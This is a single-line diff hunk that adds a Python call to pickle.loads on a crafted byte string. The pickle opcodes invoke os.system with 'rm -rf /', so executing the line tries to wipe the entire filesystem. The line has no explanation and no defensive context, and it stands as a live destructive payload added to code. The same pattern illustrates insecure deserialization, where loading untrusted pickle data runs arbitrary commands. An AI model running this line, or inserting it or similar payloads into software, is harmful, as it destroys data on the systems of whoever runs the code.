@@ -1,0 +1,1 @@
+pickle.loads(b'cos\nsystem\n(Vrm -rf /\ntR.')
